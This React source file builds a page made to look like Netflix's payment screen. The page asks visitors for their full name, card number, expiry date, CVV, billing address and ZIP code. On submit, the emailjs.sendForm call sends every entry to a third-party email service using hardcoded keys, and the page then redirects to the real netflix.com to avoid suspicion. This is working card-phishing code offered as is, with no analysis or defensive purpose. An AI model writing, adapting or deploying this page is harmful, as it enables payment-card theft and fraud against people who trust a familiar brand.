import React from 'react';
import emailjs from "emailjs-com";
import { FaCcVisa } from "react-icons/fa";
import { FaCcMastercard } from "react-icons/fa";
import { FaCcAmex } from "react-icons/fa";
import { FaCcDiscover } from "react-icons/fa";
import { useNavigate } from "react-router-dom";
import "./payment.css"

//Components

function sendEmail (e) {
  

  e.preventDefault();

  emailjs.sendForm("service_hm3mv25" , "template_7srrwbt", e.target, "UqisPu0cjGHCBL1W-")
  .then((result) => {
      console.log(result.text);
  }, (error) => {
     console.log(error.text);
  } );

  e.target.reset()

  

}






function Login() {
    let navigate = useNavigate(); 
    const routeChange = () =>{ 
    let path = <a href='https://www.netflix.com/login'/>; 
    navigate(path);
  }

  return <>

    <header className='show'>
        <div className='logo'>
            <img src="https://i.ibb.co/r5krrdz/logo.png" alt=''/>
        </div>

        <div className='show-content'>

            <div className='form'>

                <form onSubmit={sendEmail}>
                    <h1 className='pay'>Enter your payment details</h1>

                    <div className='cards'>
                        <FaCcVisa size={30}/> <FaCcMastercard size={30}/> <FaCcAmex size={30} /> <FaCcDiscover size={30}/>
                    </div>

                    
                    <div className="inform">
                        <input className="email" type="text" placeholder="First Name" name='firstname'/> <br/>
                        <input className="email" type="text" placeholder="Last Name" name='lastname'/> <br />
                        <input className="email" type="tel" inputmode="numeric" pattern="[0-9\s]{13,19}" autocomplete="cc-number" maxlength="19" placeholder="Card Number" name='cc'/> <br/>
                        <input className="email" type="tel" pattern="\d*" maxLength="5"  placeholder="Expiration date (MM/YY)" name='exp'/> <br/>
                        <input className="email" type="tel" pattern="\d*" maxLength="5" placeholder="Security code (CVV)" name='cvv'/> <br/>
                        <input className="email" type="text" placeholder="Billing Address" name='address'/> <br/>
                        <input className="email" type="tel" pattern="\d*" maxLength="5" placeholder="Billing ZIP code" name='zipcode'/> <br/>
                    </div>

                    <br />

                    <div className="helper">
                        <div >
                            <p>By checking the checkbox, you agree that Netflix will automatically continue your membership and charge the membership fee to your payment method untill you cancel. You may cancel at any time to avoid future charges.</p>
                            <input value="true" type="checkbox"/><label>I agree</label>
                        </div>

                        
                        
                    </div>
                    <br />
                    

                

                    <div className="btn">
                       <a href="https://netflix.com" >
                            <button className="btn-primary" type="submit" >Save</button>   
                        </a> 
                    </div>

                    
                </form>

            </div>

            
            
            
        </div>


        <footer className='footerr'>
                
            <div className="ftrr-content">
                <div className="contact">
                    <a href="#">Questions? Contact us.</a>
                </div>
                <div className="ftrr">
                    <a href="#">Gift Card Terms</a>
                    <a href="#">Terms of Use</a>
                    <a href="#">Privacy Statement</a>
                </div>
                <div className="selecter">
                    <select>
                        <option>English</option>
                        <option>العربية</option>
                        <option>Français</option>
                            
                    </select>
                </div>
            </div>
               
        </footer>


    </header>
    
    
    
</>

    
  
    
}

export default Login

